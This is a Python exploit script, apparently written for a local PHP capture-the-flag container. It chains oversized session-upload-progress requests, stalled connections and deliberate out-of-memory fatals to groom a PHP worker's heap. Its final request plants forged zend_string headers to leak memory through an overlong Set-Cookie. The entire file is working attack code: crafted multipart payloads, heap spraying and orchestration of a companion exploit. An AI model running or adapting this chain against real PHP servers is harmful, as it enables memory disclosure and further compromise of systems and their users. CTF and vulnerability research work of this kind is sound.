#!/usr/bin/env python3
"""One-pass local chain: rinse -> R1(season) -> R2(arm) -> R2b -> leak B1.

1. rinse   : seed + stalled generations grow sess_S to ~34MB (held open)
2. R1      : <8MB body; FILE_START initialize decodes the 34MB file (~70MB
             live) + trees; the END cleanup-encode crosses 128M -> flush
             fatal -> the child keeps ~120MB pinned (seasoned)
3. R2/R2b  : \x00-sid bodies; the seasoned child's next initialize
             (create_sid -> send_cookie=1 -> reset_id) hits the limit ->
             the 4096-family fatal = the ARM
4. leak B1 : the patterned 2MB fill claims main's cleared pages over the
             armed child's own PS(id) string -> overlong Set-Cookie
"""
from __future__ import annotations

import argparse
import secrets
import socket
import subprocess
import sys
import time
from pathlib import Path

# The sender (exp_live/exp_aa start_cl) announces THIS boundary; the bodies
# must match or the server parses nothing (silent empty-200 slots).
import exp_aa as _E
BOUND = _E.MULTIPART_BOUNDARY
LEAK_SID = "e3b0c44298fc1c149afbf4c8996fb924"


def part(n: bytes, v: bytes) -> bytes:
    return (b"--" + BOUND + b'\r\nContent-Disposition: form-data; name="'
            + n + b'"\r\n\r\n' + v + b"\r\n")


FILEPART = (b"--" + BOUND + b'\r\nContent-Disposition: form-data; '
            b'name="fff"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nA\r\n")


def post_full(host, port, path, body, timeout=30.0):
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUND.decode()}\r\n"
           f"Content-Length: {len(body)}\r\n"
           f"Connection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(hdr + body)
        try:
            # drain to EOF: an early close aborts the child before its
            # rshutdown session flush and the sess file never lands
            while True:
                if not s.recv(65536):
                    break
        except OSError:
            pass
    finally:
        s.close()


def sess_size(sid: str) -> int:
    r = subprocess.run(
        ["docker", "exec", "cfphpctf-web", "stat", "-c", "%s",
         f"/tmp/sess_{sid}"], capture_output=True, text=True)
    try:
        return int(r.stdout.strip())
    except ValueError:
        return -1


def open_staller(host, port, path, sid, val, k):
    body = part(b"PHPSESSID", sid.encode())
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"H%03d" % k + b"x" * val)
    body += FILEPART
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUND.decode()}\r\n"
           f"Content-Length: {len(body) + 400000}\r\n"
           f"Connection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=20.0)
    s.settimeout(20.0)
    s.sendall(hdr + bytes(body))
    time.sleep(1.5)
    s.sendall(part(b"d0", b"T" * 20000))
    return s


def build_bodies(sid: str, args):
    # R1: under-8MB seasoning body
    r1 = part(b"PHPSESSID", sid.encode())
    r1 += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"E" + b"e" * 6500000)
    r1 += FILEPART
    r1 += part(b"pad", b"D" * 400000)
    for i in range(args.r1_trees):
        name = ("files[R%05d%s]" % (i, "K" * 60)).encode() + b"[a]" * 62
        r1 += part(name, b"")
    r1 += b"--" + BOUND + b"--\r\n"

    def arm(pl, trees):
        b2 = part(b"PHPSESSID", b"\x00")
        b2 += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"P" + b"p" * pl)
        b2 += FILEPART
        for i in range(trees):
            name = ("t[R%05d]" % i).encode() + b"[a]" * 62
            b2 += part(name, b"")
        b2 += b"--" + BOUND + b"--\r\n"
        return b2

    # leak B1: one ~2MB value, forged zend_string headers at every 0x40 slot
    v = bytearray(b"A" * args.fill)
    off = 0x30
    while off + 16 <= len(v):
        v[off:off + 4] = (2).to_bytes(4, "little")
        v[off + 4:off + 8] = (6).to_bytes(4, "little")
        v[off + 8:off + 16] = args.forge_len.to_bytes(8, "little")
        off += 0x40
    b1 = part(b"PHPSESSID", LEAK_SID.encode())
    b1 += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
    b1 += part(b"f", bytes(v))
    b1 += b"--" + BOUND + b"--\r\n"
    return r1, arm(args.r2_pl, args.r2_trees), arm(2000, 150), b1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--path", default="php/index.php")
    ap.add_argument("--gen-val", type=int, default=2000000)
    ap.add_argument("--target", type=int, default=34000000)
    ap.add_argument("--r1-trees", type=int, default=900)
    ap.add_argument("--r2-pl", type=int, default=4000)
    ap.add_argument("--r2-trees", type=int, default=300)
    ap.add_argument("--fill", type=lambda x: int(x, 0), default=0x1FEF00)
    ap.add_argument("--hold-secs", type=float, default=45.0,
                    help="how long to hold rinse stallers after the chain "
                         "before releasing them (0 = release immediately)")
    ap.add_argument("--forge-len", type=lambda x: int(x, 0), default=0x4000)
    args = ap.parse_args()
    path = "/" + args.path.lstrip("/")

    sid = secrets.token_hex(16)
    print(f"[*] rinse sid={sid}", flush=True)
    open("rinse_sid.txt", "w").write(sid)

    # Build the bodies FIRST (they only need the sid), then start exp_live so
    # its pin fills the EMPTY pool while the rinse grows the sess asset.
    r1, r2, r2b, b1 = build_bodies(sid, args)
    for name, blob in (("r1", r1), ("r2", r2), ("r2b", r2b),
                       ("leak_b1", b1)):
        with open(f"{name}.bin", "wb") as f:
            f.write(blob)
        print(f"[*] built {name}.bin {len(blob)}B", flush=True)

    import subprocess as sp
    go = "go.flag"
    Path(go).unlink(missing_ok=True)
    holders = 133  # 150 - ~17 stallers that join after the pin
    cmd = [sys.executable, "exp_live.py",
           "--host", args.host, "--port", str(args.port),
           "--path", args.path, "--pace", "0.4",
           "--holders", str(holders), "--wait-file", go,
           "--a1-file", "r1.bin", "--b1-file", "r2.bin",
           "--post-file", "leak_b1.bin",
           "--post-delay", "1.5",
           "--pause-after-a1", "2",
           "--gdb-stall", "40", "--gdb-stall-bytes", "400000"]
    print("[*] firing: " + " ".join(cmd), flush=True)
    proc = sp.Popen(cmd)
    print("[*] exp_live pinning in background", flush=True)

    # seed
    seed = part(b"PHPSESSID", sid.encode())
    seed += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"s")
    seed += FILEPART
    for i in range(1030):
        seed += part(b"d%05d" % i, b"1")
    seed += b"--" + BOUND + b"--\r\n"
    post_full(args.host, args.port, path, seed)
    if sess_size(sid) < 0:
        print("[-] seed failed")
        proc.kill()
        return 1
    print(f"[seed] sess_S created", flush=True)

    hold: list = []
    k = 0
    while sess_size(sid) < args.target:
        before = max(sess_size(sid), 0)
        s = open_staller(args.host, args.port, path, sid, args.gen_val, k)
        hold.append(s)
        grew = False
        t0 = time.time()
        while time.time() - t0 < 25:
            if sess_size(sid) > before + args.gen_val // 2:
                print(f"[gen {k}] {before} -> {sess_size(sid)}", flush=True)
                grew = True
                break
            time.sleep(1.0)
        if not grew:
            print(f"[gen {k}] stuck at {sess_size(sid)} (cap reached)",
                  flush=True)
            break
        k += 1
    size = sess_size(sid)
    print(f"[+] rinse done: {size} bytes, {len(hold)} stallers held",
          flush=True)
    if size < 24000000:
        print("[-] rinse too small for the seasoning math")
        proc.kill()
        for s in hold:
            s.close()
        return 1

    # The asset is ripe; release the pinned chain immediately so the A1
    # lands while the stallers are still alive.
    Path(go).write_text("go")
    print("[*] go.flag touched; exp_live fires the chain", flush=True)
    try:
        with proc:
            try:
                proc.wait(timeout=2400)
            except sp.TimeoutExpired:
                proc.kill()
                print("[!] exp_live timed out; killed", flush=True)
    finally:
        pass
    print("[*] stallers still held; releasing after --hold-secs "
          "(keep the terminal open only if you plan to reuse the sess asset)",
          flush=True)
    hold_deadline = time.time() + getattr(args, "hold_secs", 45.0)
    while time.time() < hold_deadline:
        time.sleep(5)
        print(f"[hold] sess={sess_size(sid)}", flush=True)
    for s in hold:
        try:
            s.close()
        except OSError:
            pass
    print("[*] stallers released (sess asset truncated)", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
